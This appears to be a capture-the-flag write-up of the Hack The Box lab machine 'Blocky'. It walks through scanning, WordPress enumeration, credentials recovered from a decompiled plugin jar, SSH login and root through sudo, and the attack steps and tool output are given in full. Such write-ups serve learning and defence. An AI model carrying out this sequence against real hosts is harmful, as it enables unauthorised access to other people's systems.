---
layout: post
category: writeup
---

## Machine Info

- Name: Blocky
- Description: Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.
- Difficulty: Easy 

## Initial Access

Nmap:
```bash
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I quickly attempt to login to ftp with anonymous access:
```bash
HTB ftp blocky.htb
Connected to blocky.htb.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (blocky.htb:kali): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
```

Going to the ip on the webpage redirects to blocky.htb, so I add it to my /etc/hosts file.

A quick dirsearch confirms this is wordpress:
```bash
HTB  dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://blocky.htb 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/blocky.htb/_24-01-19_08-50-02.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-19_08-50-02.log

Target: http://blocky.htb/

[08:50:02] Starting: 
[08:50:03] 301 -    0B  - /index.php  ->  http://blocky.htb/
[08:50:05] 403 -  291B  - /icons/
[08:50:07] 301 -  307B  - /wiki  ->  http://blocky.htb/wiki/
[08:50:07] 200 -  380B  - /wiki/
[08:50:07] 301 -  313B  - /wp-content  ->  http://blocky.htb/wp-content/
[08:50:07] 200 -    0B  - /wp-content/
[08:50:09] 200 -    2KB - /wp-login.php
[08:50:09] 301 -  310B  - /plugins  ->  http://blocky.htb/plugins/
[08:50:09] 200 -  745B  - /plugins/
[08:50:10] 200 -   19KB - /license.txt
[08:50:11] 301 -  314B  - /wp-includes  ->  http://blocky.htb/wp-includes/
[08:50:11] 200 -   40KB - /wp-includes/
[08:50:14] 301 -  313B  - /javascript  ->  http://blocky.htb/javascript/
[08:50:14] 403 -  296B  - /javascript/
[08:50:19] 200 -    7KB - /readme.html
```

Then I will wpscan while these are running:
```bash
[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

Nothing really stood out besides the username notch.

Visiting the wiki endpoint I se its under construction:
![[assets/images/2024-01-19-blocky-writeup-image-1.png]]

I'll start a dirsearch in there, I'll also visit the plugins directory:

![[assets/images/2024-01-19-blocky-writeup-image-2.png]]

I see some files that seem interesting let me download them and analyze them.

I start by unzipping the file then decompiling the class

![[assets/images/2024-01-19-blocky-writeup-image-3.png]]

I see some credentials, let me see if they work on wordpress. 

![[assets/images/2024-01-19-blocky-writeup-image-4.png]]

Nope, so now I will try to ssh in:

```bash
myfirstplugin ssh notch@blocky.htb
notch@blocky.htb's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$
```

Boom IA
## Privilege Escalation

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 

Sorry, try again.
[sudo] password for notch: 
Sorry, try again.
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch#
```

Very simple privilege escalation

## Beyond Root

One real main issue, which is leaked credentials in jar file, if that is not needed then we should delete it from the webpage. I'll go ahead and delete the jar file. 